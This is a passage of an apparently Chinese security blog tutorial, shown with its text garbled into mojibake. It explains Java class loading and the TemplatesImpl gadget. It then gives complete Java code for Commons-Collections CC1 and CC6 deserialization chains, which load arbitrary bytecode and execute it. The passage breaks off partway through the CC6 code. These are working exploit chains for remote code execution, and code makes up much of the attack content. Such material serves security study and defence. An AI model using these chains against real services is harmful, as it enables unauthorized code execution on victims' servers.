<li><p>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±» æˆ‘ä»¬æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨ Loader å¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿå½“ç„¶æ˜¯ é file åè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ http åè®®ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨HTTPåè®®æ¥æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹Javaæ˜¯å¦èƒ½ä»è¿œç¨‹HTTPæœåŠ¡å™¨ä¸ŠåŠ è½½.classæ–‡ä»¶ã€‚</p>
</li>
</ul>
<h4 id="httpè¿œç¨‹åŠ è½½ï¼š"><a href="#httpè¿œç¨‹åŠ è½½ï¼š" class="headerlink" title="httpè¿œç¨‹åŠ è½½ï¼š"></a>httpè¿œç¨‹åŠ è½½ï¼š</h4><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªæ¶æ„ç±»ï¼Œæ”¾åœ¨ <a href="http://localhost/Test.class">http://localhost/Test.class</a></p>
<p>(æŠŠç¼–è¯‘å¥½çš„classæ–‡ä»¶å•ç‹¬æ‹¿å‡ºæ¥ï¼Œæ”¾åœ¨å¦å¤–ä¸€ä¸ªç›®å½•ï¼Œè¿›å…¥è¿™ä¸ªç›®å½•ï¼Œåˆ©ç”¨pythonå¯åŠ¨httpæœåŠ¡å°±è¡Œ<code>python -m http.server 80</code>)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234616607.png" alt="image-20240527234616607"></p>
<p> æˆåŠŸè¯·æ±‚åˆ°æˆ‘ä»¬çš„ &#x2F;Test.class æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ã€‚ æ‰€ä»¥ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡<code> ClassLoader</code>çš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ© ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528082827361.png" alt="image-20240528082827361"></p>
<h4 id="fileæœ¬åœ°åŠ è½½"><a href="#fileæœ¬åœ°åŠ è½½" class="headerlink" title="fileæœ¬åœ°åŠ è½½:"></a>fileæœ¬åœ°åŠ è½½:</h4><p>æˆ‘ä»¬ç¼–è¯‘Testç±»ï¼Œæ”¾åœ¨â€C:\Users\Desktopâ€ ï¼Œä¹Ÿæ˜¯æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ã€‚ä»–æ˜¯åˆ™ä½¿ç”¨ <code>FileLoader</code> æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯» æ‰¾.classæ–‡ä»¶ ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234632078.png" alt="image-20240527234632078"></p>
<h3 id="åˆ©ç”¨ClassLoader-defineClassç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨ClassLoader-defineClassç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç </h3><p>å‰é¢æˆ‘ä»¬è®¤è¯†åˆ°äº†å¦‚ä½•åˆ©ç”¨<code>URLClassLoader</code>åŠ è½½è¿œç¨‹classæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚ç ã€‚å…¶å®ï¼Œä¸ç®¡æ˜¯åŠ  è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528090248851.png" alt="image-20240528090248851"></p>
<ul>
<li>å…¶ä¸­ï¼š <code>loadClass </code>çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœº åˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ<code> findClass</code> ã€‚</li>
<li><code>findClass</code> çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨ æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ <code>defineClass</code>ã€‚</li>
<li><code>defineClass</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» ã€‚</li>
</ul>
<p>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ <code>defineClass</code> ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava é»˜è®¤çš„ <code>ClassLoader#defineClass </code>æ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ã€‚ </p>
<p>æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ defineClass è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨<code> defineClass</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ <code>defineClass</code> åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚</p>
<p>ï¼ˆä¸è¿›è¡Œåˆå§‹åŒ–ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084507413.png" alt="image-20240528084507413"></p>
<p>ï¼ˆåˆå§‹åŒ–ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084342573.png" alt="image-20240528084342573"></p>
<p>è¿™é‡Œï¼Œå› ä¸ºç³»ç»Ÿçš„<code> ClassLoader#defineClass</code> æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œä¸å¾—ä¸ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚ åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º<code>defineClass</code>æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ TemplatesImpl çš„åŸºçŸ³ã€‚</p>
<h2 id="TemplatesImpl-è§£æ"><a href="#TemplatesImpl-è§£æ" class="headerlink" title="TemplatesImpl è§£æ"></a>TemplatesImpl è§£æ</h2><p>æˆ‘ä»¬çŸ¥é“defineClass()å¯ä»¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åƒä¹‹å‰æ‰¾CCé“¾ä¸€æ ·ï¼Œåè¿‡å»æ‰¾è°è°ƒç”¨äº†defineClass()ï¼Œæ‰¾åˆ°äº†<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>ä¸‹çš„<code>TemplatesImpl.TransletCLassLoader.defineClass()</code></p>
<p>JAVAä¸­æ²¡æœ‰è®¿é—®æƒé™ä¿®é¥°è¯çš„æ˜¯defaultç±»å‹ï¼Œå®ƒå¯ä»¥è®¿é—®åœ¨åŒä¸€ä¸ªåŒ…ä¸­çš„å…¶ä»–ç±»çš„æˆå‘˜ã€‚	</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526215828567.png" alt="image-20240526215828567"></p>
<p>çœ‹å“ªè°ƒç”¨äº†<code> defineClass</code>ï¼Œçœ‹åˆ°è¿˜æ˜¯åŒç±»<code>TemplatesImpl.defineTransletClasses()</code>è°ƒç”¨äº†<code>defineClass </code>ä½†è¿˜æ˜¯privateï¼Œåˆæ‰¾å“ªé‡Œè°ƒç”¨äº†<code>defineTransletClasses ()</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220246988.png" alt="image-20240526220246988"></p>
<p>æ‰¾åˆ°äº†<code> TemplatesImpl.getTransletInstance()</code>ï¼Œæ­£å¥½<code>newInstance()</code>,ä½†æ˜¯è¿˜æ˜¯ privateã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220419165.png" alt="image-20240526220419165"></p>
<p>æœ€ç»ˆæ‰¾åˆ°äº† <code>TemplatesImpl.newTransformer()</code>æ˜¯public</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220516376.png" alt="image-20240526220516376"></p>
<p>æ­£å¥½è¿™ä¸ªç±»ç»§æ‰¿äº†Serializableæ¥å£ï¼Œå°±å¾ˆæ–¹ä¾¿æˆ‘ä»¬</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105116341.png" alt="image-20240527105116341"></p>
<p>è°ƒç”¨é“¾</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527154250480.png" alt="image-20240527154250480"></p>
<h3 id="å®ç°TemplatesImplçš„é€»è¾‘"><a href="#å®ç°TemplatesImplçš„é€»è¾‘" class="headerlink" title="å®ç°TemplatesImplçš„é€»è¾‘"></a>å®ç°TemplatesImplçš„é€»è¾‘</h3><p>æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤ä»£ç å…¶å®å°±éœ€è¦è¿™ä¸¤è¡Œï¼Œä½†æ˜¯è‚¯å®šè¿™æ ·æ˜¯ä¸èƒ½è¿è¡Œçš„ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105424926.png" alt="image-20240527105424926"></p>
<p>è®©æˆ‘ä»¬è·Ÿè¿›<code>TemplatesImpl()</code>ï¼Œå…¶å®åé¢çš„ä¸èµ‹å€¼ï¼Œä¹Ÿèƒ½èµ°åˆ°æˆ‘ä»¬æƒ³è¦çš„<code>getTransletInstance()</code>ï¼Œè·Ÿè¿›<code>getTransletInstance()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105723051.png" alt="image-20240527105723051"></p>
<p><code>_name</code>éœ€è¦èµ‹å€¼</p>
<p><code>_class</code>ä¸èƒ½èµ‹å€¼ï¼Œå› ä¸ºæˆ‘ä»¬å°±æƒ³è°ƒç”¨<code>defineTransletClasses()</code></p>
<p>è·Ÿè¿›<code> defineTransletClasses()</code></p>
<p>éšåä»£ç ä¼šèµ°åˆ°<code>_class[transletIndex].newInstance()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105855030.png" alt="image-20240527105855030"></p>
<p>è·Ÿè¿›<code> defineTransletClasses()</code></p>
<p><code>_bytecodes</code>éœ€è¦èµ‹å€¼</p>
<p><code>_tfactory</code>éœ€è¦è°ƒæ–¹æ³•ï¼Œéœ€è¦èµ‹å€¼,å»çœ‹ä¸€ä¸‹ <code>_tfactory</code>æ˜¯ä»€ä¹ˆ</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110211207.png" alt="image-20240527110211207"></p>
<p>å¯ä»¥çœ‹åˆ°<code>_tfactory</code>æ˜¯transientï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¹¶ä¸èƒ½åºåˆ—åŒ–ã€‚è¿™å°±å¾ˆæœ‰æ„æ€äº†ï¼Œè¦ç”¨ä½†æ˜¯ä¸èƒ½åºåˆ—åŒ–ï¼Œé‚£æœ‰å¯èƒ½åœ¨<code>readObect()</code>é‡Œé¢ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110600370.png" alt="image-20240527110600370"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110644855.png" alt="image-20240527110644855"></p>
<p>éšå<code>defineClass(_bytecodes[i])</code>åŠ è½½å­—èŠ‚ç </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213049967.png" alt="image-20240527213049967"></p>
<h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><p>å…¶ä»–çš„éƒ½å¾ˆç®€å•ï¼Œå”¯ä¸€çš„éš¾ç‚¹æ˜¯å¯èƒ½ä¸çŸ¥é“è¿™é‡Œä¸ºå•¥è¿™æ ·å†™</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Tests.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br></code></pre></td></tr></table></figure>

<p>å› ä¸º_bytecodesæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213730267.png" alt="image-20240527213730267"></p>
<p>ä½†æ˜¯<code>defineClass()</code>æ¥æ”¶ä¸€ä¸ªä¸€ç»´æ•°ç»„</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213808776.png" alt="image-20240527213808776"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="ç©ºæŒ‡é’ˆæŠ¥é”™"><a href="#ç©ºæŒ‡é’ˆæŠ¥é”™" class="headerlink" title="ç©ºæŒ‡é’ˆæŠ¥é”™"></a>ç©ºæŒ‡é’ˆæŠ¥é”™</h3><p>é‡åˆ°ä¸€ä¸ªç©ºæŒ‡é’ˆé”™è¯¯</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527112539992.png" alt="image-20240527112539992"></p>
<p>è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527153320593.png" alt="image-20240527153320593"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç©ºæŒ‡é’ˆæŠ¥é”™ï¼Œçœ‹ä¸€ä¸‹é€»è¾‘ï¼Œå°±æ˜¯è¦æ±‚<code>_bytecodes</code>çˆ¶ç±»ä¸º<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>ç„¶åæŠŠiçš„å€¼èµ‹ç»™<code>_transletIndex</code>  (_transletIndexé»˜è®¤ä¸º-1) ï¼Œå¦åˆ™å°±ç©ºæŒ‡é’ˆæŠ¥é”™ã€‚</p>
<p>å½“<code>_transletIndex</code>&lt;0ä¹Ÿä¼šæŠ¥é”™ã€‚æ‰€ä»¥åªèƒ½å°†çˆ¶ç±»æ”¹ä¸º<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527170701421.png" alt="image-20240527170701421"></p>
<p>å¯¼å…¥<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> å‘ç°éœ€è¦å®ç°ä¸¤ä¸ªæ¥å£</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527113056413.png" alt="image-20240527113056413"></p>
<p><code>TemplatesImpl</code>çš„æ‰€æœ‰é€»è¾‘å°±èµ°å®Œäº†</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527173454095.png" alt="image-20240527173454095"></p>
<h2 id="CC1çš„TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC1çš„TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC1çš„TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC1çš„TemplatesImpl çš„å®ç°æ–¹å¼</h2><p>æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œæœ¬è´¨ä¸Šæ¥è®²å°±æ˜¯æ¢äº†ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<span class="hljs-comment">//è°ƒç”¨templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>		<span class="hljs-comment">//CC1</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, 			Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC6çš„TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC6çš„TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC6çš„TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC6çš„TemplatesImpl çš„å®ç°æ–¹å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<span class="hljs-comment">//è°ƒç”¨templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>		<span class="hljs-comment">//CC6</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> 